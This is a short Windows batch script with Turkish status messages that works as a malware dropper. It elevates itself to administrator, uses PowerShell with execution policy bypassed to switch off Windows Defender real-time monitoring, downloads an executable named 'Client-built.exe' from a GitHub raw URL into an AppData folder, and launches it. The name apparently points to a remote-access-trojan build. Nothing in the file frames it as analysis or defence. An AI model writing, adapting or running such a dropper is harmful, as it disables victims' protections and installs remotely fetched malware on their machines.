@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo [1] Yonetici yetkisi OK

:: Klasörü oluþtur ve indir
powershell -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true; $dir = $env:APPDATA + '\SubDir'; if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir }; $out = $dir + '\Client-built.exe'; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/zugar00311/aa/refs/heads/main/Client-built.exe' -OutFile $out -UseBasicParsing; Write-Host ('Yol: ' + $out); Write-Host ('Var mi: ' + (Test-Path $out)); Start-Process $out"

echo [2] Tamamlandi
pause